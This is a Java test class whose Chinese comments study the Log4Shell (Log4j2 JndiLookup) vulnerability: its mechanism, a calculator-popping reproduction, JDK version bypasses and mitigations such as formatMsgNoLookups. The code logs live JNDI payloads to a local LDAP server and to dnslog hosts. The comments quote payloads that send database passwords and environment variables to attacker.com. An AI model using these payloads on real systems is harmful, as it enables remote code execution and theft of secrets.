package com.yale.test.java.classpath.ldap.client;

import org.apache.commons.lang.text.StrLookup;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.util.Loader;
import org.apache.logging.log4j.util.PropertiesUtil;

/*
 * https://mp.weixin.qq.com/s/wHUv-lFXBUcPp0uIjvHSaw 《Log4j2 Jndi 漏洞解析、复盘 》
 * https://sspai.com/post/70394 《理解 Log4Shell 漏洞》
 * https://my.oschina.net/u/4394125/blog/3310581 《关于JDK高版本下RMI、LDAP+JNDI bypass的一点笔记 》
 * 而对于客户端而言，则更加简单，仅需要引用对应的log4j-core的漏洞版即可，当前所引入的为2.14.1的版本。
 * 启动测试，结果则如下所示：
 * 当我启动main方法后可以发现 ${jndi:ldap://127.0.0.1:1389/badClassName} 这段代码最终打开了本地的一个计算器程序，漏洞验证成功。
 * Console，RollingFile 等则是我们一般情况下常用的插件，而此次出现重大漏洞问题的则是一个相对不太常用的插件，
 * 名叫：org.apache.logging.log4j.core.lookup.JndiLookup.class在log4j-core-2.13.3.jar里面
 * JNDI resource path prefix used in a J2EE container 
 * static final String CONTAINER_JNDI_RESOURCE_PATH_PREFIX = "java:comp/env/";
 * Lookup插件在Log4j2的使用场景上是为了获取配置而使用的，如Log4j2框架中所包含的JavaLookup插件，表示当你要在Log4j2框架中获取Java的配置信息时，则会调度执行该JavaLookup来返回对应的Java配置信息，如下所示：
 * error代码中直接填写：${java.version} 则最终会返回对应的Java版本信息
 * 同理Log4j2中还封装的有DockerLookup，KubernetesLookup等，当你要在服务中获取Docker的元数据信息时，则最终会被Log4j2框架调度执行到DockerLookup方法中，由DockerLookup来执行具体的交互并返回对应的数据。
 * 那么此时再来去看JndiLookup则一目了然了，没错，JndiLookup只是Log4j2框架中各种Lookup的其中一个，其作用则是通过Jndi规范去获取对应的配置信息时使用。
 * 触发Lookup插件的场景是使用：${}，如上述的${java:version} 表示使用JavaLookup插件，传入值为version然后返回对应的结果，而此处的${jndi:ldap://ip:port} 则同理表示调用JndiLookup传入值为 ldap://ip:port 。
 * jndi是目录接口，所以JndiLookup中则是各种目录接口的实现集合，如下图所示可以发现JndiLookup中可直接调用的具体实现类有很多，其中就包括LdapURLContext
 * 首先我们当前的注入方式是${jndi:ldap://127.0.0.1:1389/badClassName} 也就是让Log4j2框架执行error时，触发JndiLookup，然后调用JndiLookup的ldap协议，以此达到注入的效果。
 * 那么在此之前，我们需要做的第一件事是先搭建一个ldap协议的服务端，只有这样才能做到Log4j2触发ldap协议时，可以成功访问你当前本地的1389端口，核心代码如Ladp.java所示
 * 第二步通过asm框架字节码的方式生成一个class类，class类主要内容便是执行Runtime.getRuntime.exec("calc.exe") 也就是该class类一旦被执行则会立即调用本地的计算器服务。
 * 第三步则是ldap协议被访问后，则将当前的class类作为byte流输出为对应的响应结果
 * 针对jndi的问题，先做下相关说明：首先jndi本身并不是Log4j2框架的产物，而是Jdk自身的功能，对应的包路径为com.sun.jndi 。
 * jndi 在jdk中的定位是目录服务应用程序接口，目录服务可以想象为一个树，而java中常用的目录服务协议则是rmi和ldap，ldap本身就是一套常用的目录访问协议，
 * 一般我们windows常用的AD域也都是基于ldap协议的，而jndi的作用则是通过目录协议如ldap根据对应的目录名，去查找对应服务端的对象，并把该对象下载到客户端中来。
 * 所以针对上述jndi:ldap的漏洞，其实这本身就不是问题，因为这本身就是jndi的功能，如果你的目录访问协议是可控的情况下，那么使用jndi则是安全的。
 * 而Log4j2框架中JndiLookup使用到了Jndi的功能，但是对应的传参则较为随意，这就是一个很大的问题，如通过http的方式给业务服务传参数为：${jndi:ldap://yuming.com/service} ，
 * 而业务方服务又恰巧把该参数打到了日志中，这就会导致很大的漏洞，因为谁也无法保证注入的yuming.com/service返回的对象是什么，相当于是一个很大的后门，注入者可以通过此漏洞任意执行所有代码。
 * 
 * 既然jndi的问题无法解决，那作为日志框架的“我”自然要从自身寻找问题，所以Log4j2框架本身的解决方案则是设置域名白名单，类白名单等操作，
 * 如果jndi:ldap对应的访问路径并非127.0.0.1同网段的服务等，则不会执行lookup() ，以此避免访问到外部的恶意服务上去。
 * Log4j2的代码修复记录如下：
 * 
 * 老版本(log4j-core-2.13.3.jar)中关于org.apache.logging.log4j.core.net.JndiManager.class的lookup方法代码是这样的，直接调用context.lookup()，context为jdk自身的jndi类
 * 而修复后代码是这样的：在调用context.lookup()之前，做了较多的拦截操作，判断了对应的白名单类，以及host等操作
 * https://github.com/apache/logging-log4j2/blob/log4j-2.15.0-rc2/log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java
 * 对于各公司内解决方案，实际上不见得一定要通过短时间内升级jar包的方式来解决，因为java体系内的各种log包的依赖，由于各种历史原因导致当前也是有点较为繁琐，
 * 如果想要短时间内更加无痛解决的情况下，直接在已有的项目下增加log4j2.formatMsgNoLookups=true，也可以完美解决该问题。true是关闭lookups的意思.
 * 对应代码如下：log4j2.formatMsgNoLookups配置该参数为true以后，类org.apache.logging.log4j.core.pattern.MessagePatternConverter.class(log4j-core-2.13.3.jar)
 * 中的属性noLookups就把变成true，属性noLookups的值是从类org.apache.logging.log4j.core.util.Constants.class通过
 * PropertiesUtil.getProperties().getBooleanProperty("log4j2.formatMsgNoLookups", false);获取的。
 * 会在对应的日志输出进行format格式化时，不再解析你当前日志中的 ${} 的代码块，造成的影响面则是服务代码中所有的 ${} 均不会再解析Lookup
 * log4j修复后的jar包为:
 * https://github.com/EmYiQing/LDAPKit  可以绕过高版限制，利用本地gadget触发反序列化漏洞造成RCE
 * 知道了，jdk1.8.0_181可以复现出来，高于1.8.0_181的版本就复现不出来了
 * https://mp.weixin.qq.com/s/1oesQz-UkpqKN3BQH9BKtw 《独家！Log4j2 RCE漏洞代码浅析》
 * https://my.oschina.net/u/4394125/blog/3310581 《关于JDK高版本下RMI、LDAP+JNDI bypass的一点笔记 》
 * 
 * ${jndi:dns://xxx.xxx.xxx.xxx:port/${hostName} -${sys:user.dir}- ${sys:java.version} - ${java:os}}
 * https://github.com/apache/logging-log4j2/commit/d82b47c
 * https://github.com/apache/logging-log4j2/commit/c2b07e37995004555c211cdf0bb169d6a6a6f96b
 * 详细漏洞披露可查看：https://issues.apache.org/jira/projects/LOG4J2/issues/LOG4J2-3201?filter=allissues
 * JNDI注入相关知识参考：
 * https://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649734687&idx=3&sn=9007a3affba3ad1bbdb8277691224fe1&chksm=888c8e70bffb0766cd0b5d5b38afb2b6a4d2c4452ea9a0e15a7cb41753ec9378fa0f0218d0ea&scene=21#wechat_redirect 《JAVA安全之JNDI注入》，2020年；
 * https://mp.weixin.qq.com/s?__biz=Mzg3MDAzMDQxNw==&mid=2247488857&idx=1&sn=86ede84946d18167fea05deccc6ef3c2&chksm=ce955867f9e2d1714f9e131d79221bdf284cff7592342b62b8f8c2cfc7df6ac090ef744bca35&scene=21#wechat_redirect 《JAVA JNDI注入知识详解》
 * https://www.cnblogs.com/tr1ple/p/12232601.html 《关于<Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上）>看后的一些总结-2 》
 */
public class TestAttack {
	private static final Logger logger = LogManager.getLogger(LogManager.ROOT_LOGGER_NAME);
	/**
	 * 先把com.yale.test.java.classpath.ldap.server.Main.java运行起来
	 * 然后再运行本类TestAttack.java就能弹出计算机了
	 * @param args
	 */
	public static void main(String[] args) {
		//log4j2这个漏洞跟jdk版本是不是也有关系啊，我jdk8u191为啥复现不出来啊.知道了，jdk1.8.0_181可以复现出来，高于1.8.0_181的版本就复现不出来了
		//JDK版本<8u191，可通过LDAP引入外部JNDI Reference：
		//JDK版本>=8u191，当存在 org.apache.naming.factory.BeanFactory 与 com.springsource.org.apache.el 等依赖时，可在返回的JNDI Reference中指定相应工厂类及setter方法，或是由LDAP引入序列化链实现RCE：
		//同时可以结合一些其它 StrLookup 适当变形，以及配合官方测试用例中脏数据`"?Type=A Type&Name=1100110&Char=!"`可绕过rc1。RC2版本对此异常进行了捕获。
		//参考连接：[Log4j2 Manual Lookups](https://www.docs4dev.com/docs/en/log4j2/2.x/all/manual-lookups.html)
		//参考连接：[LOG4J2-3201 - Limit the protocols JNDI can use by default](https://github.com/apache/logging-log4j2/commit/d82b47c6fae9c15fcb183170394d5f1a01ac02d3)
		//直接运行本类，会输出:13:14:11.339 [main] ERROR  - java.version = Java version 1.8.0_281, os = Windows 10 10.0, architecture: amd64-64
		logger.error("java.version = ${java:version}, os = ${java:os}");
		logger.error("sys是系统变量: = ${sys:user.dir},系统变量:${sys:java.version}");
		logger.error("${jndi:ldap://127.0.0.1:1389/badClassName}");
		logger.error("${jndi:ldap://5bc8rv.ceye.io/exp}");
		//运行成功之后去http://www.dnslog.cn/网站上面点击[Refresh Record]按钮就能看到信息了
		logger.error("${jndi:ldap://rh4yb1.dnslog.cn/exp}");

		/*
		 * https://github.com/apache/logging-log4j2/pull/608#issuecomment-991354707
		 * ${jndi:ldap://www.attacker.com:1389/${env:MYSQL_PASSWORD}}
		 * ${jndi:ldap://${env:MYSQL_PASSWORD}.attacker.com:1389/a}
		 * ${jndi:ldap://${bundle:application:spring.datasource.password}.attacker.com:1389/a}
		 * ${jndi:ldap://${sys:db.password}.attacker.com:1389/a}
		 */
		//sys、env 这两个 lookup 的 payload 也在讨论中被频繁提起，实际上他们分别对应的是 System.getProperty() 和 System.getenv()，能够获取一些环境变量和系统属性。部分内容是可以被携带在 dnslog 传出去的。
		//除了 sys、env 以外我还发现 ResourceBundleLookup 也可以获取敏感信息，但没有看到有人讨论 Bundle，所以重点讲一下。
		logger.error("为啥出不来啊？");
		logger.error("Lookups的值为:" + org.apache.logging.log4j.core.util.Constants.FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS);
		/**
		 * https://mp.weixin.qq.com/s/1oesQz-UkpqKN3BQH9BKtw 《独家！Log4j2 RCE漏洞代码浅析 》
		 * 执行流程
		 * 当POC(Proof of Concept，漏洞证明代码)作为message传递给Logger类的error 、 fatal 等方法后，略去一些非关键流程，
		 * 会进入到org.apache.logging.log4j.core.pattern.MessagePatternConverter.class类的format方法对${内容进行解析替换：
		 * 之后进入org.apache.logging.log4j.core.lookup.Interpolator.class类的lookup方法，由前缀值 jndi 获取到 JndiLookup 类：
		 * org.apache.logging.log4j.core.lookup.JndiLookup.class
		 * Interpolator类中的关键代码是这个:strLookupMap.put(LOOKUP_KEY_JNDI, Loader.newCheckedInstanceOf("org.apache.logging.log4j.core.lookup.JndiLookup", StrLookup.class));
		 * 最终调用对应的 lookup 方法发起请求，也就是遍地开花的dnslog。。。
		 * 
		 * https://mp.weixin.qq.com/s?__biz=MzIxNDAyNjQwNg==&mid=2456098698&idx=1&sn=8c66b476cb303bdf413337bc5c92e127&chksm=803c6643b74bef55d1606a424e555ef09e27b8736928acdca027332453c6d9e4d7a11d7e589d&scene=132#wechat_redirect
		 * 《甲方需谨慎对待log4shell漏洞的修复 》
		 * 修复方案:
		 * 1、jvm参数 -Dlog4j2.formatMsgNoLookups=true
		 * 2、在应用程序的classpath下添加log4j2.component.properties配置文件文件，文件内容：log4j2.formatMsgNoLookups=True
		 * 3、设置系统环境变量 LOG4J_log4j2_formatMsgNoLookups=True
		 * 这三个是等效的，也就是说设置其中一个就行了，理想上我偏向于推送系统环境变量，因为这个最简单，运维可以直接推送，而且是全局的，当然其他也是可以的。
		 * 4、移除log4j-core包中JndiLookup类文件,并重启服务.具体命令:zip -q -d log4j-core-*.jar /org/apache/logging/log4j/core/lookup/JndiLookup.class
		 * 5、建议JDK使用11.0.1、8u191、7u201、6u211及以上的高版本
		 * 6、禁用JNDI.在spring.properties里添加spring.jndi.ignore=true
		 * 但实际上呢？有下面两个问题：
		 * 1、这三个在2.10以下均处于失效状态
		 * jdk版本：
		 * 有的人说升级jdk版本后你最多是触发dnslog你其他啥也做不了，排查了一下自己的jdk版本后就高枕无忧了。这种想法也是片面的，经过群友周末的发酵，
		 * 哪怕盲打本地gadget比较困难，现在可以确定的是最差情况下可以外带服务器上的敏感信息，比如springboot上的配置信息、系统的环境变量等。
		 * 这种外带敏感信息的方式甚至可以外带出数据库密码等信息，为其他的攻击做铺垫。具体可以参考浅蓝写的文章（https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg）。
		 * 
		 */
	}
	
	/**
	 * 同时可以结合一些其它 StrLookup 适当变形，以及配合官方测试用例中脏数据`"?Type=A Type&Name=1100110&Char=!"`可绕过rc1。
	 * https://mp.weixin.qq.com/s/1oesQz-UkpqKN3BQH9BKtw 《独家！Log4j2 RCE漏洞代码浅析 》
	 * @throws Exception
	 */
//	public void testBadUriLookup() throws Exception {
//		int port = embeddedLdapRule.embeddedServerPort();
//		Context context = emmbeddedLdapRule.context();
//		context.bind("cn=" + RESOURCE + "," + DOMAIN_DSN, new Fruit("Test Message"));
//		final StrLookup lookup = new JndiLookup();
//		String result = lookup.lookup(LDAP_URL + port + "/" + "cn=" + RESOURCE + "," + DOMAIN_DSN + "?Type=A Type&Name=1100110&Char=!");
//		if (result != null) {
//			fail("Lookup returned an object");
//		}
//	}
}
